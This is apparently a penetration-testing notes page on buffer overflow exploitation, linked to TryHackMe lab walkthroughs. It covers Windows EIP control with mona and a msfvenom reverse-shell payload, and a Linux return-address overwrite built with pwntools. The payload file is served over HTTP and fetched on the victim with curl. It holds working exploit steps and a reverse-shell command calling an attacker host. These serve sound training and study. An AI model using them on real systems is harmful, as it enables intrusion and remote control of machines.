# Buffer Overflow

## **Windows**

**Examples**

[buffer-overflow-prep.md](../../../walkthroughs/tryhackme/buffer-overflow-prep.md "mention")[brainstorm.md](../../../walkthroughs/tryhackme/brainstorm.md "mention")[gatekeeper.md](../../../walkthroughs/tryhackme/gatekeeper.md "mention")[brainpan-1.md](../../../walkthroughs/tryhackme/brainpan-1.md "mention")

## **Crash Replication & Controlling EIP**

Run fuzzer against program to find how many bytes it takes to crash the program.

**Option #1**

**Kali**

```
python fuzzer.py $VICTIM $VICTIMPORT
```

**Option #2**&#x20;

**Kali**

```
python -c 'print("A"* 3000)'
nc -v $TESTMACHINE 9999
```

Run following command and add output to your buffer in your exploit program.

**Option #1**

**Kali**

```
 msf-pattern_create -l $bytesToCrashProgram
```

**Option #2**&#x20;

I then used pattern\_create to make my payload and then added to my new script exploit.py

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l $bytesToCrashProgram
```

Run the exploitable program within Immunity Debugger with your updated exploit code. then you could be able to find the EIP offset. Update your code to have this many As be sent. Then add 4 Bs and remove the output from msf-pattern\_create. Rerun again and the EIP should be set as your Bs(42424242)

**Immunity Debugger**

```
!mona findmsp -distance $bytesToCrashProgram
```

### Finding Bad Characters

**Bad Chars #1**

```
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

**Bad Chars #2**

```
badChars = (
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;

**Immunity Debugger**

```
!mona modules
```



**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m $DLL.dll
```

### Exploit

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

## **Linux**

**Examples**

[obscure.md](../../../walkthroughs/tryhackme/obscure.md "mention")

### **Crash Replication & Controlling EIP**

**Kali**

```
cyclic 256
```

**Kali**

```
gdb ret
```

**Kali(gdb)**

```
r
```

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

This tells us it crashes after 136 characters

**Kali**

```
cyclic -l 0x6261616a
```

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

We see the win function is located at 0x400646

**Kali**

```
objdump -t ret
```

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Confirmed it crashes after 136.

**Kali**

```
python -c 'print("A"* 137)' | ./ret 
```

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

I wanted to confirm it would crash where we expected so I added the program into a for loop

**payload.py - version 2**&#x20;

```
from pwn import *
import subprocess

for i in range(130, 140):
	payload = b'A'*i + p64(0x400646)
	print ("Current value: " + str(i))

	f = open('/root/payload.bin', 'wb')
	f.write(payload)
	f.close
	os.system("(cat payload.bin; cat) | ./ret")
```

We can see 137 did work on our local box and got us to the win function when adding it's address to the script

**Kali**

```
python payload.py 
```

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Now to create our payload and send it to the victim

**payload.py - version 2**&#x20;

```
from pwn import *

payload = b'A'*136 + p64(0x400646)

f = open('/root/payload.bin', 'wb')
f.write(payload)
f.close
```

Testing that the payload still works on our local machine.

**Kali**

```
(cat payload.bin; cat) | ./ret
```

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
python2 -m SimpleHTTPServer 82
```

We are root but only within the docker container.

**Victim**

```
cd /tmp
curl http://$KALI:82/payload.bin -o payload.bin
(cat payload.bin; cat) | /ret
```

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

## &#x20;<a href="#find-pages" id="find-pages"></a>

